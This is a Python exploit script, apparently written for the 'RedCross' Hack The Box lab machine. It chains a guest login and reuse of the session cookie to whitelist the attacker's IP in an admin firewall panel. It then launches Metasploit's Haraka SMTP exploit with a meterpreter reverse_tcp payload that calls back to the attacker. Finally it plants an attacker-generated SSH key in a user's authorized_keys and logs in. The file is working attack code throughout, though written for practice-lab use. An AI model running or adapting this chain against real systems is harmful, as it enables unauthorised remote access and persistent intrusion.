#!/usr/bin/python
import sys, os
import requests, socket
import netifaces as ni
from time import sleep
from Crypto.PublicKey import RSA
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

CGREEN = '\033[92m'
CRED = '\033[91m'
CEND = '\033[0m'

def main(ip):
	phpsessid = getSession() # Fetch PHPSESSID
	since = login(phpsessid) # Fetch the 'SINCE' cookie
	addRule(phpsessid,since,ip) # Add IP to firewall rules to access port 1025 later

	key = RSA.generate(2048)
	pubkey = key.publickey()

	pub = pubkey.exportKey('OpenSSH')
	priv = key.exportKey('PEM')

	with open("id_rsa", 'w') as file:
		os.chmod("id_rsa", 0600)
		file.write(priv)

	with open("id_rsa.pub", 'w') as file:
		file.write(pub)

	with open("cmd.rc", 'w') as file:
		file.write("upload id_rsa.pub /home/penelope/.ssh/authorized_keys"+"\n"+"exit")
		file.close()

	# Start Metasploit
	try:
		sleep(1)
		file = os.getcwd()+"/cmd.rc"
		print '{}[*]{} Starting Metasploit... Please wait approximately 1 to 2 minutes'.format(CGREEN,CEND)
		os.system('msfconsole -q -x "use exploit/linux/smtp/haraka; set SRVHOST {}; set email_from artikrh@redcross.htb; set email_to penelope@redcross.htb; set rhost 10.10.10.113; set rport 1025; set payload linux/x64/meterpreter/reverse_tcp; set LHOST tun0;set AutoRunScript multi_console_command -r {}; run; exit -y"'.format(ip,file))
	except:
		print '{}[*]{} Failed to start the Metasploit module. Exiting...'.format(CRED,CEND)
		sys.exit()

	print '{}[*]{} Ready to drop in SSH'.format(CGREEN,CEND)
	os.system('rm id_rsa.pub cmd.rc && ssh -q -i id_rsa penelope@redcross.htb')
	os.system('rm id_rsa')

def addRule(phpsessid,since,ip):
	cookies = {
		'PHPSESSID': '{}'.format(phpsessid),
    		'LANG': 'EN_US',
    		'SINCE': '{}'.format(since),
    		'LIMIT': '10',
    		'DOMAIN': 'admin',
	}

	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	data = 'ip={}&action=Allow+IP'.format(ip)

	r = requests.post('https://admin.redcross.htb/pages/actions.php', headers=headers, cookies=cookies, data=data, verify=False)
	print '{}[*]{} Whitelisted {} at the server firewall'.format(CGREEN,CEND,ip)

def login(phpsessid):
	data = 'user=guest&pass=guest&action=login'
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}

	r = requests.post('https://intra.redcross.htb/pages/actions.php', cookies=phpsessid, data=data, headers=headers, verify=False)
	since = r.cookies['SINCE']

	print '{}[*]{} Fetched the "SINCE" cookie'.format(CGREEN,CEND)
	return since

def getSession():
	with requests.Session() as s:
		r = s.post("https://intra.redcross.htb/?page=login", verify=False)
		phpsessid = {'PHPSESSID': requests.utils.dict_from_cookiejar(s.cookies)['PHPSESSID']}

	print '{}[*]{} Fetched PHPSESSID'.format(CGREEN,CEND)
	return phpsessid

if __name__ == "__main__":
	try:
		ni.ifaddresses('tun0')
		ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
	except:
		print '{}[*]{} Failed to retrieve tun0 IP address. Is your VPN on?'.format(CRED,CEND)
                sys.exit()

	try:
		socket.gethostbyname('redcross.htb')
		socket.gethostbyname('admin.redcross.htb')
		socket.gethostbyname('intra.redcross.htb')
	except socket.error:
		print '{}[*]{} Missing redcross.htb, admin.redcross.htb, intra.redcross.htb entries in /etc/hosts. Exiting...'.format(CRED,CEND)
		sys.exit()

	main(ip)
